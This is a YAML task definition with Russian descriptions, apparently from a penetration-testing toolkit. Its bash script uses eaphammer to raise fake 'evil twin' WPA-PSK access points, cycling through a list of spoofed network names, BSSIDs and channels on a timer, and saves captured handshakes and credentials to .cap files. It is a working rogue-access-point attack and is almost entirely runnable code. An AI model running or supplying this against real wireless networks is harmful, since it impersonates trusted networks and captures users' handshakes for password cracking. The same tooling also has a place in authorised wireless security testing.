description: Поднимает поддельные точки доступа по таймауту
tags:
  - wpa-psk
  - evil twin
  - handshake

arguments:
  interface:
    description: имя интерфейса wlan
  list:
    description: 'файлы со списками параметров точек доступа в формате "ESSID;BSSID;CHANNEL" (например: "FakeAP;2f:db:4c:70:74:74;8")'
    multiple: true
    replacer: '#list#'
  t:
    description: время в секундах для переключения между точками
    default: '60'
    replacer: '#timeout#'
    metavar: SECONDS
    regex: '[0-9]+'
  d:
    description: директория, куда скрипт будет складывать .cap файлы (их будет много!)
    default: 'etwin-pulsar'
    replacer: '#dir#'
    metavar: DIRECTORY

mode:
  format:
    interface: '{!r}'
    list: '{!r}'
    t: '{!r}'

shell: bash

script: >-
  runstatus=true;
  outdir=#dir#;
  mkdir -p $outdir;
  trap stopthis SIGINT;
  stopthis() { runstatus=false; };
  while $runstatus; do
  for ap in $(cat #list# | sort -u); do 
  sudo timeout -s INT #timeout# eaphammer --interface #interface# --essid $(echo $ap | awk -F ';' '{print $1}') --auth wpa-psk --password 00000000 --creds --psk-capture-file "$(realpath $outdir/etwin-pulsar-$(date +%Y%m%d%H%M%S).cap)" --bssid $(echo $ap | awk -F ';' '{print $2}') --channel $(echo $ap | awk -F ';' '{print $3}');
  done;
  done
  